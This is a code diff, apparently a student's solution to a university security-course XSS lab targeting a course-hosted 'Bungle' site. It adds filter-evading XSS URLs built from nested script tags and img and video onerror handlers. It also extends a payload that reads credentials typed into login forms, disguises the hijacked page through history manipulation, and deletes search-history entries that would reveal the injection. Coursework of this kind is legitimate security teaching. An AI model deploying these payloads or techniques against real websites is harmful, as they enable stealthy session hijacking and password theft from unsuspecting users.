@@ -70,15 +70,23 @@ function payload(attacker) {
             var target = `http://bungle-cs461.csl.illinois.edu/`;
 
             function updateCurrentPage(newHtml, newTitle, newPage) {
+                
+                var oldState = {
+                    "html": $("html").html()
+                };
+                console.log("Pushing Old State");
+                window.history.pushState(oldState, newTitle, newPage);
+
                 $("html").html(newHtml);
                 var currentTitle = newTitle;
                 var currentPage = newPage;
-                var stateDict = {
+                var newState = {
                     "html": $("html").html(),
                     "title": currentTitle,
                     "page": currentPage
                 };
-                window.history.replaceState(stateDict, currentTitle, currentPage);
+                console.log("Replacing with new State");
+                window.history.replaceState(newState, currentTitle, currentPage);
                 $("title")[0].text = currentTitle;
                 console.log("Update Current Page");
                 inject();
@@ -126,7 +134,7 @@ function payload(attacker) {
                 $("html").contents().find("#log-in-btn").click(function(event){
                     console.log("Log in attempted");
                     // $("head title", window.parent.document).text("NOT Bungle!");
-                    history.pushState(null, null, target);
+                    // history.pushState(null, null, target);
                     var usern=$("html").contents().find("#username").val();
                     var passw=$("html").contents().find("#userpass").val();
                     
@@ -148,7 +156,7 @@ function payload(attacker) {
                 $("html").contents().find("#log-out-btn").click(function(event){
                     console.log("Logout attempted");
                     // $("head title", window.parent.document).text("Bungle!");
-                    history.pushState(null, null, target);
+                    
                     var usern=$("#html").contents().find("#username").val();
                     var passw=$("#html").contents().find("#userpass").val();
                     // log({event: "login", user: usern, pass: passw});
@@ -157,6 +165,8 @@ function payload(attacker) {
                         // log({event: "logout", user: currentUser});
                         currentUser = ""
                         // updateHistory();
+                        // $("html").html(data);
+                        // history.pushState({"html" : data}, null, target);
                         updateCurrentPage(data, "NOT Bungle!", "./");
                         return false;
                     });
@@ -165,7 +175,7 @@ function payload(attacker) {
                 // NEW ACCOUNT BUTTON
                 $("html").contents().find("#new-account-btn").click(function(event){
 					$("head title", window.parent.document).text("Bungle!");
-					history.pushState(null, null, target);
+					// history.pushState(null, null, target);
 					var usern=$("html").contents().find("#username").val();
 					var passw=$("html").contents().find("#userpass").val();
 					// log({event: "login", user: usern, pass: passw});
@@ -189,7 +199,7 @@ function payload(attacker) {
                 //BUNGLE BUTTON
                 $("html").contents().find("#bungle-lnk").click(function(event){
                     $("html").contents().find("#bungle-lnk").removeAttr("href");
-                    history.pushState(null, null, target);
+                    // history.pushState(null, null, target);
                     $.get("./")
                     .done(function(data) {
                         // updateHistory();
@@ -203,7 +213,7 @@ function payload(attacker) {
 					// $("head title", window.parent.document).text("Search Results");
 					var q=$("html").contents().find("#query").val();
 					var new_target="http://bungle-cs461.csl.illinois.edu/search?q="+q
-					history.pushState(null, null, new_target);
+					// history.pushState(null, null, new_target);
 					// log({event: "nav", user: $("#fake_page").contents().find("#logged-in-user").text(), url:new_target});
                     $.get(new_target)
                     .done(function(data) {
@@ -219,7 +229,7 @@ function payload(attacker) {
 					// $("head title", window.parent.document).text("Search Results");
 					// var q=$("html").contents().find("#query").val();
 					// var new_target="http://bungle-cs461.csl.illinois.edu/search?q="+q
-					history.pushState(null, null, target);
+					// history.pushState(null, null, target);
 					// log({event: "nav", user: $("#fake_page").contents().find("#logged-in-user").text(), url:new_target});
                     $.get("./")
                     .done(function(data) {
@@ -228,8 +238,26 @@ function payload(attacker) {
                         return false;
                     });
 				});
+
+                // SEARCH HISTORY
+                $.each($(".history-item"), function() {
+                    $(".history-item").removeAttr("href");
+                    $(this).click(function() {
+                        var urlS = "./search?q=" + this.text;
+                        $.get(urlS)
+                        .done(function(data) {
+                            // history.pushState({"html" : $.parseHTML(data)}, null, urlS);
+                            updateCurrentPage(data, "Search Results", urlS);
+                            return false;
+                        });
+                    });
+                    // console.log(this.text);
+                    if (this.text.includes("payload(attacker)") || this.text.includes("fromCharCode(102")) {
+                        this.remove();
+                    }
+                });
                 
-                
+
             }
 
 
@@ -293,25 +321,47 @@ function makeLink(target, attacker, defense) {
     switch(defense) {
         case 1:
             // TODO: Implement XSS warmup 2.2.3.1
-            return  "http://bungle-cs461.csl.illinois.edu/multivac/?name=INSERT%20ATTACK%20HERE";
+            //return  "http://bungle-cs461.csl.illinois.edu/multivac/?name=INSERT%20ATTACK%20HERE";
+            /**
+             * %3C = '<'
+             * %3E = '>'
+             * %22 = '"'
+             * %3Cscript%3Ewindow.onload=function(){document.getElementsByTagName(%22a%22)[0].href=%22http://ece.illinois.edu/%22;}%3C/script%3E"
+             * 
+             */
+            return  "http://bungle-cs461.csl.illinois.edu/multivac/?name=%3Cscript%3Ewindow.onload=function(){document.getElementsByTagName(%22a%22)[0].href=%22http://ece.illinois.edu/%22;}%3C/script%3E";
         case 2:
             // TODO: generate XSS URL for defense level 2.2.3.2 (replace/extend this sample)
             return target + "/search?xssdefense=" + (defense-2) + "&q=" + 
                 encodeURIComponent(
                     "<script>" +
                     payload_string + 
-                    ";payload();" + 
+                    ";payload(\"" + attacker + "\");" + 
                     "</script" + ">"
                 );
         case 3:
             // TODO: generate XSS URL for defense level 2.2.3.3
-            return target + "/search?xssdefense=" + (defense-2) + "&q=" + "SOLVE ME"
+            return target + "/search?xssdefense=" + (defense-2) + "&q=" + 
+                encodeURIComponent(
+                    "<scrscriptipt>" +
+                    payload_string + 
+                    ";payload(\"" + attacker + "\");" + 
+                    "</scrscriptipt" + ">"
+                );
         case 4:
             // TODO: generate XSS URL payload for defense level 2.2.3.4
-            return target + "/search?xssdefense=" + (defense-2) + "&q=" + "SOLVE ME"
+            return target + "/search?xssdefense=" + (defense-2) + "&q=" +
+                encodeURIComponent(
+                    "<img src='#' onerror=\'" +
+                    payload_string +
+                    ";payload(\"" + attacker + "\");\'>");
         case 5:
             // TODO: generate XSS URL payload for defense level 2.2.3.5
-            return target + "/search?xssdefense=" + (defense-2) + "&q=" + "SOLVE ME"
+            return target + "/search?xssdefense=" + (defense-2) + "&q=" +
+                encodeURIComponent(
+                    "<video src='#' onerror=\'" +
+                    payload_string +
+                    ";payload(\"" + attacker + "\");\'>");
         case 6:
             // TODO: generate XSS URL payload for defense level 2.2.3.6
             return target + "/search?xssdefense=" + (defense-2) + "&q=" + "SOLVE ME"
